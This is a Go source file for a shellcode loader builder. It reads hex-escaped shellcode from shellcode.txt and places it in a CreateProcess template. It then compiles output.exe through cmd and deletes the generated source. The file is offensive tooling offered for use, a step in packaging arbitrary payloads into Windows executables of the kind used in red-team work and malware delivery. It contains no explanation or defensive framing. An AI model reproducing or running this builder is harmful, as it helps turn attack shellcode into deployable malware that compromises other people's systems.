package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func main() {
	_ = os.RemoveAll(filepath.Join(".", "output.exe"))
	shellcode := parseShellCode()
	template, _ := ioutil.ReadFile("core/CreateProcess.go")
	finalCode := strings.ReplaceAll(string(template), "__SHELLCODE__", shellcode)
	newPath := filepath.Join(".", "output")
	_ = os.MkdirAll(newPath, os.ModePerm)
	_ = ioutil.WriteFile("output/main.go", []byte(finalCode), 0777)
	cmd := exec.Command("cmd", "/c", "go build -o output.exe output/main.go")
	err := cmd.Run()
	if err == nil {
		fmt.Println("go build success")
	} else {
		fmt.Println("go build error")
	}
	_ = os.RemoveAll(newPath)
}

func parseShellCode() string {
	data, _ := ioutil.ReadFile("shellcode.txt")
	spits := strings.Split(string(data), "\n")
	buf := bytes.Buffer{}
	for _, item := range spits {
		if !strings.HasPrefix(item, "\"") {
			continue
		}
		temp := strings.TrimRight(item, "\r")
		temp = strings.Trim(temp, "\"")
		temp = strings.ReplaceAll(temp, "\\x", "")
		if strings.HasSuffix(item, ";") {
			temp = strings.TrimRight(temp, "\";")
		}
		buf.Write([]byte(temp))
	}
	return buf.String()
}
